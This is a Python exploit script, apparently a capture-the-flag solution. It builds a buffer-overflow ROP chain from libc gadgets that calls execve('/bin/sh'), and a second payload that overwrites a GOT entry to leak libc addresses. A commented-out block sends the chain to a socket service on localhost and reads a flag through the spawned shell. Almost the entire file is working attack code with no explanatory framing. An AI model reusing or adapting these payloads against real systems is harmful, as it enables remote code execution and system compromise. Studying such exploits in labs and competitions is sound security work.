from struct import pack
import socket
import sys

p = lambda x : pack('Q', x)
neg = lambda x : (~x)+1
# obtained with:
# ropper -f /lib/x86_64-linux-gnu/libc.so.6 --chain "execve cmd=/bin/sh"

def rop_chain(libc):

	rebase_0 = lambda x : p(x + libc)

	rop = b'A'*56
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += b'//bin/sh'
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += p(0x0000000000000000)
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x0000000000026b72) # 0x0000000000026b72: pop rdi; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000027529) # 0x0000000000027529: pop rsi; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x000000000011c371) # 0x000000000011c371: pop rdx; pop r12; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret; 
	rop += p(0x000000000000003b)
	rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret; 

	return rop

def main():
	'''
	libc = get_set_sock_opt_address() - SETSOCKOPTOFFSET
	s = socket.create_connection(("localhost",7000))
	s.send(rop_chain(libc))
	s.recv(1024)
	s.send(b"cat flag.txt\n")
	print(s.recv(1024))
	s.close()
	'''

	pop_rdi				= p(0x400b0b)
	# write offset - setsockopt offset, 
	# setsosckopt is located at greater offset w.r.t to write, so
	# in order to obtain the address of write() function in the setsockopt
	# GOT entry it is necessary to fcause an overlap inserting in %rdi the
	# 2-complement representaion of the opposite of 0X1238a0 - 0x1111d0.
	# Addresses obtained respectively with
	# 1)nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<setsockopt\>'
	# 2)nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<write\>'

	write_wraparound	= p(0xfffffffffffed930) 
	pop_rsi_r15			= p(0x400b09)
	got 				= p(0x600ef8)
	add_PTR_r15_rdi 	= p(0x4008ca)
	setsockopt_plt		= p(0x4006d0)


	o = b'A'*40
	o += pop_rdi
	o += write_wraparound 
	o += pop_rsi_r15
	o += p(0x600ef8 - 0xf8)
	o += got
	o += add_PTR_r15_rdi
	o += pop_rdi
	o += p(1)
	o += setsockopt_plt
	sys.stdout.buffer.write(o)

if __name__ == '__main__':
	main()



